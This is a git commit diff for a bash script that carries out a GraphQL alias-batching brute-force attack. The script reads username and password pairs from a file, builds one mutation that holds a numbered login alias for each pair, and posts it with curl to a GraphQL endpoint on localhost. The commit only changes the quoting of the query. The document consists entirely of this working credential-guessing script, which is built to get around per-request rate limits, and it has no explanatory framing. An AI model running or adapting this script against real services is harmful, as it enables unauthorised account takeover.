d2b8a242ab5d11d1d8de5cd435f7c9c5a22b673e
teni <tennyomole@yahoo.com>
2024-04-12 03:01:20 +0100

    Alias Attack Fix

--- scripts/alias_based_query_batching.sh
+++ scripts/alias_based_query_batching.sh
@@ -1,15 +1,16 @@
 #!/bin/bash
-
 input_file="password_file"
 i=0;
-alias_part="mutation {";
+alias_part=' " mutation {'
 while IFS= read -r line
 do
   line_array=($line);
   ((i+=1));
-  alias_part=$alias_part" alias$i : login(username: \"${line_array[0]}\", password: \"${line_array[1]}\") {accessToken } " ;
+  alias_part=$alias_part'\n alias'$i' : login(username:  \"'${line_array[0]}'\" , password: \"'${line_array[1]}'\" )\n {\n accessToken \n }' 
 done < "$input_file";
 
-alias_part=$alias_part"}"
+alias_part=$alias_part' }" ';
+curl 'http://localhost:5013/graphql' -XPOST   -H "Content-Type: application/json" --data-raw   "{\"query\": $alias_part }"   
 
-curl 'http://localhost:5013/graphql' -X POST  -H "Content-Type: application/json" --data-raw "{\"query\":\"  $alias_part   \" }"
+
+
